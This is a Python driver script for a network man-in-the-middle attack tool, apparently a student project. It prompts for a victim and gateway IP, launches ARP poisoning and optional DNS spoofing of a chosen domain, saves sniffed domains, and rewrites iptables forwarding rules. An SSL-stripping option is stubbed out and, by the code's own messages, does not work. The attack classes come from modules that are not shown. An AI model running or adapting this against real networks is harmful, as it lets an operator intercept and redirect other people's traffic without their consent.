import multiprocessing
import os
import sys
import time
from scapy.config import conf
from arp_poisoning import ARPoison
from dns_spoofing import DNSpoof
from ssl_stripping import SSLstrip


def stop_proc(proc):
    proc.join(10)
    if proc.is_alive():
        proc.terminate()




def main():
    victim = ""
    gateway = ""
    interface = conf.iface
    DNS_spoofing = False
    save_domains = False
    SSL_stripping = False
    queue_nr = 0

    try:

        #setting the parameters for the attacks
        victim = input("Please enter victim IP address: ")
        gateway = input("Please enter gateway IP address: ")
        print("Set victim to " + victim + " and gateway to "+gateway)

        #setting the attacks that will be done
        dns_spf = input("Do you want to perform DNS spoofing? [y/n]")
        if(dns_spf == 'y' or dns_spf == 'Y'): 
            DNS_spoofing = True 
        
        ssl_strp = input("Do you want to perform SSL stripping [y/n]")
        if(ssl_strp == 'y' or ssl_strp == 'Y'): 
            print("Sorry, doesn't work right now.")
        else: 
            print("Doesn't work anyway...")

        #setting the values for dns spoofing 
        if DNS_spoofing: 
            domain_to_spoof = ''
            domain_to_spoof = input("Enter the domain you would like to spoof with: (Keep in mind the attack will not work for domains that use HSTS) ")
            while domain_to_spoof == '': 
                domain_to_spoof = input(" You did not enter any domain, please specify a valid domain you would like to spoof: ")
            domain_to_spoof = domain_to_spoof+"."
            ip_to_spoof = ''
            ip_to_spoof = input("Enter the IP address you would like to redirect " + str(domain_to_spoof) + " to : ")
            if ip_to_spoof == '':
                print("You did not enter any IP address, " + str(domain_to_spoof) + " will be redirected to the default IP address, a website that keeps loading forever")
                ip_to_spoof='0' 
            save_sniffed_domains = input("Would you like to save the sniffed domains in a file?: [y/n]: ")
            if( save_sniffed_domains == 'y' or save_sniffed_domains == 'Y' ): 
                save_domains = True
            else: 
                save_domains = False

        #setting the values for ssl stripping
        if SSL_stripping: 
            port = input("Please enter a port for ssl: ")
            while port == '': 
                port = input("You did not enter a port, please do: " )
            
        
        #Setting the IP tables
        os.system('iptables -P FORWARD DROP')

        if DNS_spoofing:
            os.system('iptables -I FORWARD -i ' + conf.iface + ' -j NFQUEUE --queue-num ' + str(queue_nr))

        os.system('iptables -A FORWARD -i ' + conf.iface + ' -j ACCEPT')


        #####
        # Starting the processes for the attacks 
        #####

        #ARP poisoning
        arp = ARPoison(victim,gateway)

        # Start ARP poisoning process
        arp_process = multiprocessing.Process(target=arp.start, name="ARP Poisoning")
        arp_process.start()

        #If user chooses to do DNS spoofing
        if DNS_spoofing:
            dns = DNSpoof(ip_to_spoof,domain_to_spoof, save_domains)

            # Start DNS spoofing process
            dns_process = multiprocessing.Process(target=dns.start, args=[queue_nr], name="DNS Spoofing")
            dns_process.start()

        #If user chooses to do SSL stripping
        if SSL_stripping:
            ssl = SSLstrip(port, victim)

            # Start SSL stripping process
            ssl_process = multiprocessing.Process(target=ssl.start, name="SSL Stripping")
            ssl_process.start()



        time.sleep(50000)

    except KeyboardInterrupt:
        
        # Stop attck processes
        stop_proc(arp_process)
        if DNS_spoofing:
            stop_proc(dns_process)
            dns.stop()
        if SSL_stripping:
            stop_proc(ssl_process)

        # Restore IP tables
        if DNS_spoofing:
            os.system('iptables -D FORWARD -i ' + interface + ' -j NFQUEUE --queue-num ' + str(queue_nr))


        os.system('iptables -D FORWARD -i ' + interface + ' -j ACCEPT')

        sys.exit(0)



if __name__ ==  "__main__":
    main()
